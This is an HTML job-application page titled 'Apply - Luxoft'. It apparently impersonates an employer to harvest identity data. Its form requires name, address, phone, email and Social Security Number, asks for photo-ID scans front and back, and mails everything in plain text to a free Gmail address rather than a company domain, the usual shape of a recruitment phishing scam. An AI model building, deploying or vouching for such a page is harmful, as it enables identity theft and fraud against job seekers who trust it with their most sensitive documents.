<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Apply - Luxoft</title>
  <link rel="stylesheet" href="style.css"/>
</head>
<body>
  <div class="container">
    <h2>Application Form</h2>
    <form action="mailto:luxoftorganization@gmail.com" method="POST" enctype="text/plain">
      <label for="name">Full Name:</label><br/>
      <input type="text" name="name" required><br/>
      <label for="address">Address:</label><br/>
      <input type="text" name="address" required><br/>
      <label for="phone">Phone Number:</label><br/>
      <input type="text" name="phone" required><br/>
      <label for="email">Email Address:</label><br/>
      <input type="email" name="email" required><br/>
      <label for="ssn">Social Security Number (SSN):</label><br/>
      <input type="text" name="ssn" required><br/>
      <label for="id_front">Upload Photo ID (Front):</label><br/>
      <input type="file" name="id_front" accept="image/*"><br/>
      <label for="id_back">Upload Photo ID (Back):</label><br/>
      <input type="file" name="id_back" accept="image/*"><br/><br/>
      <input type="submit" value="Submit Application" class="btn">
    </form>
  </div>
</body>
</html>
